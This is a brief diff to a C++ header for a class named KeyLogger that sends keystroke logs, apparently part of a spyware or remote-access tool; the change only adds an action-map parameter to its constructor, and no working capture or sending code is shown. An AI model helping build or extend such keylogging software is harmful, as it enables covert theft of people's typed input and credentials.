@@ -20,7 +20,7 @@
 class KeyLogger : public Sender {
 
 public:
-    explicit KeyLogger(const Stream &stream);
+    explicit KeyLogger(const Stream &stream, std::unordered_map<std::string, std::function<void(nlohmann::json &)>> &actionMap);
     void sendLastKeyloggerLog();
     void sendAll();
     void tryStart();
